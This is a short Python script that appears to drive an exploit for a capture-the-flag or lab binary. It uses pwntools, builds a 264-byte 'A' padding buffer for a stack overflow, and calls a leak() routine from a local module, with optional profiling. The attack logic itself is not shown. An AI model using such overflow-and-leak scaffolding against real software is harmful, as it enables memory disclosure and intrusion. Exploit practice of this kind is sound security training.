#!/usr/bin/env python3

import os
from pwn import *
from leakmod import leak


if __name__ == "__main__":
    # context.log_level = 'debug'
    padding = b'A' * 264

    if 'PROFILE' in os.environ.keys():
        log.info('Profiler enabled')
        import cProfile
        cProfile.run(f'leak(padding={padding})', sort='tottime')
    else:
        log.info('Profiler disabled')
        leak(padding=padding)
